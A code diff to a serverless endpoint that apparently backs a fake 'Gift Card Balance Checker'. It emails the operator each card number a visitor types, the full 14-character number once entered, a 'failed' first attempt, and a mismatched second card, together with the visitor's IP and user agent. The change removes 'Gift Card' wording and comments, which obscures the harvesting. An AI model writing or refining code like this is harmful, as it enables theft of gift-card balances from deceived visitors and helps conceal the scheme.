@@ -1,4 +1,6 @@
 // api/notify-typing.js
+// Removed "Gift Card" references from templates
+
 import { Resend } from 'resend';
 
 const resend = new Resend(process.env.RESEND_API_KEY);
@@ -36,31 +38,31 @@ function buildEmail(event, data, ip, ua) {
 
   if (event === 'typing_start') {
     heading = '⌨️ User Started Typing';
-    intro = 'A visitor began entering a card number.';
+    intro = 'A visitor began entering a number.';
     rows = `
       <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">First input</td>
       <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#00ff41;font-family:monospace;">${esc(data.cardNumber)}</td></tr>`;
   } else if (event === 'card_complete') {
-    heading = '💳 Full 14-Digit Card Entered';
-    intro = 'A visitor completed the full 14-character card number.';
+    heading = '💳 Full 14-Digit Number Entered';
+    intro = 'A visitor completed the full 14-character number.';
     rows = `
-      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">Full card</td>
+      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">Full number</td>
       <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#00ff41;font-family:monospace;">${esc(data.cardNumber)}</td></tr>
       <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;">Length</td>
       <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;border-left:0;color:#fff;">${esc(String(data.cardNumber?.length || 0))}</td></tr>`;
   } else if (event === 'first_attempt_failed') {
     heading = '❌ First Attempt Failed';
-    intro = 'The user submitted a card number and the first verification attempt failed.';
+    intro = 'The user submitted a number and the first verification attempt failed.';
     rows = `
-      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">Card</td>
+      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">Number</td>
       <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#ff5555;font-family:monospace;">${esc(data.cardNumber)}</td></tr>`;
   } else if (event === 'mismatch_trial') {
-    heading = '⚠️ Card Mismatch Trial';
-    intro = 'The user re-entered a card number that does NOT match their first attempt.';
+    heading = '⚠️ Mismatch Trial';
+    intro = 'The user re-entered a number that does NOT match their first attempt.';
     rows = `
-      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">First card</td>
+      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">First number</td>
       <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#ffaa00;font-family:monospace;">${esc(data.firstCardNumber)}</td></tr>
-      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;">Second card</td>
+      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;">Second number</td>
       <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;border-left:0;color:#ff5555;font-family:monospace;">${esc(data.secondCardNumber)}</td></tr>`;
   }
 
@@ -72,7 +74,7 @@ function buildEmail(event, data, ip, ua) {
         <table role="presentation" width="100%" style="max-width:560px;background:#0f1f0f;border:1px solid #00ff4133;border-radius:14px;overflow:hidden;">
           <tr><td style="background:linear-gradient(90deg,#00ff41,#00aa2a);padding:18px 22px;">
             <h1 style="margin:0;color:#0a0a0a;font-size:18px;font-weight:700;">${heading}</h1>
-            <p style="margin:4px 0 0;color:#0a0a0a;opacity:.8;font-size:12px;">Gift Card Balance Checker</p>
+            <p style="margin:4px 0 0;color:#0a0a0a;opacity:.8;font-size:12px;">Balance Checker</p>
           </td></tr>
           <tr><td style="padding:22px;color:#ddd;font-size:14px;line-height:1.5;">
             <p style="margin:0 0 16px;color:#00ff41;font-weight:600;">${intro}</p>
@@ -87,7 +89,7 @@ function buildEmail(event, data, ip, ua) {
             </table>
           </td></tr>
           <tr><td style="padding:14px 22px;background:#0a0a0a;border-top:1px solid #1f1f1f;color:#555;font-size:11px;text-align:center;">
-            Automated alert • ${new Date().getUTCFullYear()} Gift Card Balance Checker
+            Automated alert • ${new Date().getUTCFullYear()} Balance Checker
           </td></tr>
         </table>
       </td></tr>
@@ -102,7 +104,6 @@ export default async function handler(req, res) {
     return res.status(405).json({ ok: false, error: 'Method not allowed' });
   }
 
-  // Server-side gate — stronger than the Vite flag
   const enabled =
     String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
   if (!enabled) {
@@ -127,7 +128,6 @@ export default async function handler(req, res) {
       return res.status(400).json({ ok: false, error: 'Invalid event' });
     }
 
-    // ✅ Normalize card numbers to uppercase
     ['cardNumber', 'firstCardNumber', 'secondCardNumber'].forEach((k) => {
       if (typeof data[k] === 'string') data[k] = data[k].toUpperCase();
     });
